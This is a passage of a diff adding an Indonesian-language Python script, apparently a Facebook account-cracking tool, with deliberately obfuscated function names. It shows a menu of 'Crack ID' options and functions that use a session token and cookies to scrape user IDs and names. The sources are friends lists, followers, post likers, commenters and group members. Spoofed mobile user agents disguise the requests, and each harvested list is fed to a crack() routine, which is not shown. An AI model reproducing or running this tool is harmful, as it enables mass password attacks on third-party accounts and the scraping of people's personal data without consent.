+        var_author();_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()
+    elif pmu in ['5','05','005','e']:hasil()
+    elif pmu in ['6','06','006','f']:cek_hasil()
+    elif pmu in ['0','00','000','z']:jalan('%s╠══[%s!%s] %sTerima Kasih Telah Menggunakan SC Ini'%(O,P,O,P));jalan('%s╚══[%s!%s] %sSemoga Harimu Menyenangkan :)\n'%(O,P,O,P));time.sleep(3);bersih();clear();_cici_cici_()
+    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()
+
+### Menu Utama
+def menu():
+    clear()
+    banner()
+    try:
+        _dapunta_ = _dapunta_dapunta_("token.txt","r").read()
+        _cici_ = _dapunta_dapunta_("cookies.txt","r").read()
+        _salsabila_ = {"cookie" : _cici_}
+        if 'null' in _cici_:
+            status_cookies = ('%sTidak'%(M))
+            W = Z
+        else:
+            status_cookies = ('%sYa'%(H))
+            W = P
+    except (KeyError,IOError):
+        _dapunta_cici_('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
+        _dapunta_cici_('%s║'%(M))
+        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
+        bersih()
+        menu_log()
+    try:
+        token = _dapunta_dapunta_("token.txt","r").read()
+        x = _req_get_("https://graph.facebook.com/me?access_token=" + token)
+        y = _js_lo_(x.text)
+        n = y['name']
+        i = y['id']
+    except requests.exceptions.ConnectionError:
+        _dapunta_cici_('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
+        _dapunta_cici_('%s║'%(M))
+        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
+        _cici_cici_()
+    except (KeyError,IOError):
+        _dapunta_cici_('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
+        _dapunta_cici_('%s║'%(M))
+        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
+        bersih()
+        menu_log()
+    try:a = _req_get_("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json();ip = a["query"]
+    except KeyError:ip = " "
+    _update_ = 'V1.6'
+    _dapunta_cici_('%s╔══[ %sSelamat Datang %s %s]'%(O,P,n,O))
+    _dapunta_cici_('%s║'%(O))
+    _dapunta_cici_('%s╠══[%s•%s] %sID : %s'%(O,P,O,P,i))
+    _dapunta_cici_('%s╠══[%s•%s] %sIP : %s'%(O,P,O,P,ip))
+    _dapunta_cici_('%s╠══[%s•%s] %sToken/Cookies : %sYa%s/%s'%(O,P,O,P,H,P,status_cookies))
+    _dapunta_cici_('%s║'%(O))
+    _dapunta_cici_('%s╠══[%s•%s] %sStatus : %sFree'%(O,P,O,P,O))
+    _dapunta_cici_('%s╠══[%s•%s] %sVersi : %sOpen Source'%(O,P,O,P,O))
+    _dapunta_cici_('%s╠══[%s•%s] %sNama : %sFree User'%(O,P,O,P,O))
+    _dapunta_cici_('%s╠══[%s•%s] %sEmail : %sNull'%(O,P,O,P,O))
+    _dapunta_cici_('%s╠══[%s•%s] %sKey : %sNull'%(O,P,O,P,O))
+    _dapunta_cici_('%s╠══[%s•%s] %sPembelian : %sNull'%(O,P,O,P,O))
+    _dapunta_cici_('%s╠══[%s•%s] %sKedaluwarsa : %sNull'%(O,P,O,P,O))
+    _dapunta_cici_('%s║'%(O))
+    _dapunta_cici_('%s╠══[%s01%s] %sCrack ID Teman/Publik'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s02%s] %sCrack ID Pengikut'%(O,P,O,W))
+    _dapunta_cici_('%s╠══[%s03%s] %sCrack ID Pencarian Nama'%(O,P,O,W))
+    _dapunta_cici_('%s╠══[%s04%s] %sCrack ID Daftar Pesan'%(O,P,O,W))
+    _dapunta_cici_('%s╠══[%s05%s] %sCrack ID Likers Post'%(O,P,O,W))
+    _dapunta_cici_('%s╠══[%s06%s] %sCrack ID Komentar Post'%(O,P,O,W))
+    _dapunta_cici_('%s╠══[%s07%s] %sCrack ID Anggota Grup'%(O,P,O,W))
+    _dapunta_cici_('%s╠══[%s08%s] %sCrack ID Dari File'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s09%s] %sCrack ID Dari Email'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s10%s] %sCrack ID Random'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s11%s] %sCrack Username'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s12%s] %sCrack ID Dari Hashtag'%(O,P,O,W))
+    _dapunta_cici_('%s╠══[%s13%s] %sCrack ID Dari Beranda'%(O,P,O,W))
+    _dapunta_cici_('%s╠══[%s14%s] %sCrack ID Pertemanan Masuk'%(O,P,O,W))
+    _dapunta_cici_('%s╠══[%s15%s] %sCrack ID Pertemanan Keluar'%(O,P,O,W))
+    _dapunta_cici_('%s╠══[%s16%s] %sMengambil Jumlah Teman'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s17%s] %sCek Opsi Hasil Crack'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s18%s] %sCek Hasil Crack'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s19%s] %sUser Agent'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s00%s] %sLog Out'%(O,P,O,P))
+    pm = _cici_dapunta_('%s╠══[%s••%s] %sPilih : '%(O,P,O,P))
+    _dapunta_cici_('%s║'%(O))
+    if pm in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+    elif pm in ['1','01','001','a']:publik(token)
+    elif pm in ['2','02','002','b']:cek_dev();followers(_salsabila_)
+    elif pm in ['3','03','003','c']:cek_dev();dump_name(_salsabila_)
+    elif pm in ['4','04','004','d']:cek_dev();dump_pesan(_salsabila_,n,i)
+    elif pm in ['5','05','005','e']:cek_dev();main_likers(_salsabila_)
+    elif pm in ['6','06','006','f']:cek_dev();main_komen(_salsabila_)
+    elif pm in ['7','07','007','g']:cek_dev();dump_grup(_salsabila_,_dapunta_)
+    elif pm in ['8','08','008','h']:dump_file()
+    elif pm in ['9','09','009','i']:dump_email()
+    elif pm in ['10','010','0010','j']:_main_random_()
+    elif pm in ['11','011','0011','k']:dump_username()
+    elif pm in ['12','012','0012','l']:cek_dev();hashtag(_salsabila_)
+    elif pm in ['13','013','0013','m']:cek_dev();beranda(_salsabila_)
+    elif pm in ['14','014','0014','n']:cek_dev();permintaan_pertemanan_masuk(_salsabila_)
+    elif pm in ['15','015','0015','o']:cek_dev();permintaan_pertemanan_keluar(_salsabila_)
+    elif pm in ['16','016','0016','p']:teman_target()
+    elif pm in ['17','017','0017','q']:cek_hasil()
+    elif pm in ['18','018','0018','r']:hasil()
+    elif pm in ['19','019','0019','s']:ugen()
+    elif pm in ['0','00','000','z']:jalan('%s╚══[%s!%s] %sSampai Jumpa %s%s%s'%(O,P,O,P,O,n,P));bersih();menu_log()
+    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+
+### User Agent Bawaan
+def defaultua():
+    ua = ua_xiaomi
+    try:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close()
+    except (KeyError,IOError):menu_log()
+
+### Menu User Agent
+def ugen():
+    var_ugen()
+    pmu = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
+    _dapunta_cici_('%s║'%(O))
+    if pmu in[""]:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+    elif pmu in ['1','01','001','a']:os.system('xdg-_dapunta_dapunta_ https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8');_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
+    elif pmu in ['2','02','002','b']:
+        os.system("rm -rf ugent.txt");ua = _cici_dapunta_("%s╚══[%s•%s] %sMasukkan User Agent : \n\n"%(O,P,O,P))
+        try:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s╔══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
+        except (KeyError,IOError):jalan("\n%s╔══[ %sGagal Mengganti User Agent %s]"%(M,P,M));_dapunta_cici_('%s║'%(M));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(M,P,M,P));menu()
+    elif pmu in ['3','03','003','c']:ugen_hp()
+    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s╠══[ %sUser Agent Berhasil Dihapus %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
+    elif pmu in ['5','05','005','e']:
+        try:ungser = _dapunta_dapunta_('ugent.txt', 'r').read()
+        except (KeyError,IOError):ungser = 'Tidak Ditemukan'
+        _dapunta_cici_("%s╚══[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(O,P,O,P,O,ungser));jalan("\n%s╔══[ %sIni Adalah User Agent Anda Saat Ini %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
+    elif pmu in ['0','00','000','f']:menu()
+    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+def ugen_hp():
+    os.system("rm -rf ugent.txt")
+    _dapunta_cici_('%s╠══[%s1%s] %sXiaomi'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s2%s] %sNokia'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s3%s] %sAsus'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s4%s] %sHuawei'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s5%s] %sVivo'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s6%s] %sOppo'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s7%s] %sSamsung'%(O,P,O,P))
+    _dapunta_cici_('%s╠══[%s8%s] %sWindows'%(O,P,O,P))
+    pc = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
+    _dapunta_cici_('%s║'%(O))
+    if pc in['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+    elif pc in ['1','01']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
+    elif pc in ['2','02']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
+    elif pc in ['3','03']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
+    elif pc in ['4','04']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
+    elif pc in ['5','05']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
+    elif pc in ['6','06']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
+    elif pc in ['7','07']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
+    elif pc in ['8','08']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
+    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+    jalan("%s╠══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
+
+### Dump ID From Public
+def publik(token):
+    try:
+        _dapunta_cici_('%s╠══[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(O,P,O,P))
+        it = _cici_dapunta_("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
+        cek_target_crack_(it)
+        try:
+            pb = _req_get_("https://graph.facebook.com/" + it + "?fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + token)
+            ob = _js_lo_(pb.text)
+            _dapunta_cici_ ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,ob['name']))
+        except (KeyError,IOError):
+            _dapunta_cici_('%s║'%(O))
+            jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P));menu()
+        r = _req_get_("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(it,token))
+        id = []
+        z = _js_lo_(r.text)
+        xc = (ob["first_name"]+".json").replace(" ","_")
+        xb = _dapunta_dapunta_(xc,"w")
+        for a in z["friends"]["data"]:
+            try:
+                id.append(a["id"]+"•"+a["name"])
+                xb.write(a["id"]+"•"+a["name"]+"\n")
+            except:continue
+        xb.close()
+        _dapunta_cici_('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)))
+        return crack(xc)
+    except (KeyError,IOError):
+        _cici_cici_('%s╚══[%s!%s] %sToken/Cookies Invalid Atau ID Tidak Ditemukan'%(M,P,M,P))
+
+### Dump ID From Followers
+def followers(cookies):
+    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan ID Target : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));_file_ = _query_+'.json';_url_dev_ = 'https://mbasic.facebook.com/subscribe/lists/?id=' + _query_;_file_ = (_query_+'.json').replace(' ','_')
+    try:os.remove(_file_)
+    except:pass
+    exec_followers(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+def exec_followers(url,cookies,_file_):
+    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
+    try:
+        for _cici_ in _sop_dev_.find_all('a',href=True):
+            if "profile.php" in _cici_.get('href'):
+                try:
+                    _name_dev_ = _cici_.text;_id_dev_ = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",_cici_.get("href")))
+                    if _name_dev_ in _buka_file_:pass
+                    elif '/' in _id_dev_:pass
+                    else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
+                except:pass
+            else:pass
+        for _cici_ in _sop_dev_.find_all('a',href=True):
+            if 'Lihat Selengkapnya' in _cici_.text:url_dev = 'https://mbasic.facebook.com/' + _cici_.get('href');exec_followers(url_dev,cookies,_file_)
+    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+
+### Dump ID From Likers Post
+def main_likers(_dapunta_):
+    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan ID Postingan : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));_file_ = _query_+'.json'
+    try:os.remove(_query_+'.json')
+    except:pass
+    _dapunta_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_);scrape_likers(_dapunta_,_url_,_file_)
+    if len(_dapunta_dapunta_(_file_).read().splitlines()) == 0:_dapunta_cici_('\n%s╚══[%s!%s] %sPostingan Tidak Ditemukan'%(M,P,M,P));_cici_cici_()
+    _dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+def scrape_likers(_dapunta_,_url_,_file_):
+    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
+    try: 
+        for _isi_ in _ses_par_.find_all('h3'):
+            for _id_ in _isi_.find_all('a',href=True):
+                try:
+                    if "profile.php" in _id_.get("href"):_a_ = _id_.get("href").split('=')[1];__id__ = _id_.text;_dapunta_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
+                    else:_a_ = _id_.get("href").split('/')[1];__id__ = _id_.text;_dapunta_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
+                except:continue
+        for _lanjut_ in _ses_par_.find_all("a",href=True):
+            if "Lihat Selengkapnya" in _lanjut_.text:
+                while True:
+                    try:scrape_likers(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
+                    except Exception as e:_dapunta_cici_('%s%s'%(M,e))
+    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+
+### Dump ID From Comment Post
+def main_komen(_dapunta_):
+    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan ID Postingan : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));_file_ = _query_+'.json'
+    try:os.remove(_query_+'.json')
+    except:pass
+    _dapunta_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/'+_query_);scrape_komen(_dapunta_,_url_,_file_)
+    if len(_dapunta_dapunta_(_file_).read().splitlines()) == 0:_dapunta_cici_('\n%s╚══[%s!%s] %sPostingan Tidak Ditemukan'%(M,P,M,P));_cici_cici_()
+    _dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+def scrape_komen(_dapunta_,_url_,_file_):
+    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
+    try: 
+        for _isi_ in _ses_par_.find_all('h3'):
+            for _id_ in _isi_.find_all('a',href=True):
+                try:
+                    if "profile.php" in _id_.get("href"):_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",_id_.get("href")));__id__ = _id_.text;_dapunta_dapunta_(_file_,'a+').write(str(_a_).split('&')[0]+'•'+__id__+'\n')
+                    else:_a_="".join(bs4.re.findall("/(.*?)\?",_id_.get("href")));__id__ = _id_.text;_dapunta_dapunta_(_file_,'a+').write(str(_a_).split('?')[0]+'•'+__id__+'\n')
+                except:continue
+        for _lanjut_ in _ses_par_.find_all("a",href=True):
+            if "Lihat komentar lainnya…" in _lanjut_.text:
+                while True:
+                    try:scrape_komen(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
+                    except Exception as e:_dapunta_cici_('%s%s'%(M,e))
+            elif "Lihat komentar sebelumnya…" in _lanjut_.text:
+                while True:
+                    try:scrape_likers(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
+                    except Exception as e:_dapunta_cici_('%s%s'%(M,e))
+    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+
+### Dump ID From Group
+class dump_grup:
+    def __init__(self,_dapunta_,_cici_):
+        self.glist=[];self._grup_=[];self.id='__dapunta__.json';self.token=_cici_;self.cookies=_dapunta_;self.header = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"};self.main_group("https://m.facebook.com/groups/?seemore")
+    def main_group(self, url_dev):
+        bs=bs4.BeautifulSoup(_req_get_(url_dev,cookies=self.cookies,headers=self.header).text,"html.parser")
+        for _cici_ in bs.find_all("a",href=True):
+            if "/groups/" in _cici_.get("href"):
+                if "category" in _cici_.get("href") or "create" in _cici_.get("href"):continue
+                else:self.glist.append({"id":"".join(bs4.re.findall("/groups/(.*?)\?",_cici_.get("href"))),"name":_cici_.text})
+        if len(self.glist) !=0:
+            _dapunta_cici_("%s╠══[%s•%s] %sKamu Bergabung Dalam %s%s%s Grup"%(O,P,O,P,O,len(self.glist),P));_dapunta_cici_('%s╠══[%s1%s] %sCari Semua Grup Bergabung'%(O,P,O,P));_dapunta_cici_('%s╠══[%s2%s] %sCari Grup Berdasar Nama'%(O,P,O,P));_dapunta_cici_('%s╠══[%s3%s] %sCari Grup Berdasar ID'%(O,P,O,P))
+            while True:
+                c=_cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P));_dapunta_cici_('%s║'%(O))
+                if c=="":continue
+                elif c=="1":self.saya()
+                elif c=="2":self.search()
+                elif c=="3":self.manual()
+                else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+        else:_dapunta_cici_("%s╠══[%s•%s] %sKamu Tidak Bergabung Dalam Grup Manapun"%(O,P,O,P));self.manual()
+    def saya(self):
+        self.fl=(self.id)
+        try:os.remove(self.fl)
+        except:pass
+        _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
+        try: 
+            url = "https://graph.facebook.com/me/groups?access_token={}".format(self.token)
+            with _req_ses_ as ses_:
+                data = ses_.get(url).json()
+                for _dapunta_ in data["data"]:
+                    try:self._grup_.append(_dapunta_["id"])
+                    except:pass
+            for _cici_ in self._grup_:
+                try:self.url_grup = ("https://mbasic.facebook.com/browse/group/members/?id=%s"%(_cici_));self.exec_grup_saya();_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
+                except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
+                except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+        except (KeyError,IOError):jalan('%s╚══[%s!%s] %sCookie Invalid'%(M,P,M,P));menu()
+        except requests.exceptions.ConnectionError:jalan('%s╚══[%s!%s] %sKoneksi Bermasaah'%(M,P,M,P));menu()
+        except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
+        except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+    def exec_grup_saya(self):
+        global count
+        with _req_ses_ as ses_:
+            try:
+                data = ses_.get(self.url_grup, cookies=self.cookies, headers=self.header).content;sop_dev = par(data, "html.parser");members = sop_dev.find("div", id="objects_container")
+                for dev in members.find_all("table"):
+                    user_ = dev["id"].replace("member_", "");nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
+                    try:_dapunta_dapunta_(self.fl,'a+').write(str(user_)+"•"+str(nama_)+"\n").close()
+                    except:pass
+                _dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
+                if "Lihat Selengkapnya" in str(sop_dev):url = sop_dev.find("a", string="Lihat Selengkapnya")["href"];url_grup = "https://mbasic.facebook.com"+url;self.exec_grup_saya()
+            except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
+            except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+    def manual(self):
+        id=_cici_dapunta_("%s╠══[%s•%s] %sMasukkan ID Grup : "%(O,P,O,P))
+        if id=="":jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+        else:
+            r=bs4.BeautifulSoup(_req_get_("https://m.facebook.com/groups/"+id,headers=header_grup,cookies=self.cookies).text,"html.parser")
+            if "konten tidak" in r.find("title").text.lower():jalan('%s╚══[%s!%s] %sGrup Privat Atau ID Salah'%(M,P,M,P));menu()
+            else:
+                self.listed={"id":id,"name":r.find("title").text};self.f(id);_dapunta_cici_('%s║'%(O));_dapunta_cici_("%s╠══[%s•%s] %sNama : %s"%(O,P,O,P,self.listed.get("name")));xd = _cici_dapunta_('%s╠══[%s•%s] %sDump ID/Username? [i/u] : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
+                if xd in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+                elif xd in ['i','I','1']:
+                    try:self.dump_id("https://m.facebook.com/groups/"+id);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
+                    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
+                    except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+                elif xd in ['u','U','2']:
+                    try:self.dump_username("https://m.facebook.com/groups/"+id);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
+                    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
+                    except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+                else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()    
+    def search(self):
+        whitelist=[];q=_cici_dapunta_('%s╠══[%s•%s] %sNama : '%(O,P,O,P)).lower()
+        if q=='':self.search()
+        else:
+            for e,i in enumerate(self.glist):
+                if q in i.get("name").lower():whitelist.append(i);_dapunta_cici_('%s╠══[%s%s%s] %s%s'%(O,P,len(whitelist),O,P,i.get("name").replace(q,"%s"%(q))))
+            if len(whitelist)==0:jalan('%s╚══[%s!%s] %sGrup Privat Atau ID Salah'%(M,P,M,P));menu()
+            else:self.choice(whitelist,q)
+    def choice(self, whitelist,q):
+        try:
+            self.listed=whitelist[int(_cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P)))-int(1)];self.f(q);_dapunta_cici_('%s║'%(O));_dapunta_cici_("%s╠══[%s•%s] %sNama : %s"%(O,P,O,P,self.listed.get("name")));xd = _cici_dapunta_('%s╠══[%s•%s] %sDump ID/Username? [i/u] : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
+            if xd in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+            elif xd in ['i','I','1']:
+                try:self.dump_id("https://m.facebook.com/groups/"+self.listed.get("id"));_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
+                except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
+                except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+            elif xd in ['u','U','2']:
+                try:self.dump_username("https://m.facebook.com/groups/"+self.listed.get("id"));_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
+                except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
